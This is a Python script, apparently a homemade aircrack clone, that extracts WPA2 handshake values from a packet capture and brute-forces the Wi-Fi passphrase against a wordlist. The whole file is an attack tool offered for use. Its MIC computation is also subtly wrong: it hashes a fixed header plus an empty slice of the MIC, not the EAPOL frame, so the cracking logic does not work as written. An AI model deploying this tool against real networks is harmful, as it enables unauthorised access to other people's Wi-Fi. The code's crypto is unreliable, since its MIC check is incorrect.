import hmac
import hashlib
import binascii
import argparse
from scapy.all import rdpcap, EAPOL, Dot11Beacon

# WPA2 PRF function to derive PTK (512 bits)
def prf_512(key, a, b):
    """ WPA2 PRF function to derive PTK from PMK """
    blen = 64  # PTK is 512 bits (64 bytes)
    r = b""
    i = 0
    while len(r) < blen:
        r += hmac.new(key, a + bytes([i]) + b, hashlib.sha1).digest()
        i += 1
    return r[:blen]

# Extract required values from PCAP
def extract_mic_nonce_ssid(input_file):
    packets = rdpcap(input_file)

    snonce, mic, sta_mac, bssid, anonce, ssid = None, None, None, None, None, None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                snonce = eapol_layer.key_nonce
                print(f"Extracted MIC: {mic.hex()}")
                print(f"Extracted SNonce: {snonce.hex()}")

            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            if not sta_mac or not bssid:
                sta_mac, bssid = packet.addr2, packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            if mic and snonce and sta_mac and bssid and anonce:
                break

        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    return mic, snonce, sta_mac, bssid, anonce, ssid

# Crack the WPA2-PSK
def crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist):
    ssid = ssid.encode()
    sta_mac = binascii.unhexlify(sta_mac.replace(':', ''))
    bssid = binascii.unhexlify(bssid.replace(':', ''))
    mic = binascii.unhexlify(mic.hex())

    for word in wordlist:
        word = word.strip()
        print(f"Trying PSK: {word}")

        # Generate PMK
        psk = word.encode()
        pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)
        print(f"PMK: {pmk.hex()}")

        # Correct WPA2 PTK Derivation
        key_data = min(sta_mac, bssid) + max(sta_mac, bssid) + min(anonce, snonce) + max(anonce, snonce)
        ptk = prf_512(pmk, b"Pairwise key expansion", key_data)
        print(f"PTK: {ptk.hex()}")

        # Correct MIC Calculation (use PTK[:16])
        mic_calc = hmac.new(ptk[:16], b'\x01\x03\x00\x75\x00\x00\x00\x00' + mic[18:], hashlib.sha1).digest()[:16]
        print(f"Calculated MIC: {mic_calc.hex()}")

        # Compare calculated MIC with extracted MIC
        if mic_calc == mic:
            print(f"✅ Correct PSK found: {word}")
            return word

    print("❌ No valid PSK found in wordlist.")
    return None

# Main function
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Crack WPA PSK using aircrack.py')
    parser.add_argument('capture_file', help='Capture file (CAP/PCAP)')
    parser.add_argument('-P', '--wordlist', required=True, help='Wordlist file')

    args = parser.parse_args()
    capture_file = args.capture_file
    wordlist_file = args.wordlist

    # Extract data from capture file
    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_nonce_ssid(capture_file)

    if mic and snonce and sta_mac and bssid and anonce and ssid:
        with open(wordlist_file, 'r') as f:
            wordlist = f.readlines()
        crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist)
    else:
        print("❌ Failed to extract necessary values from capture file.")
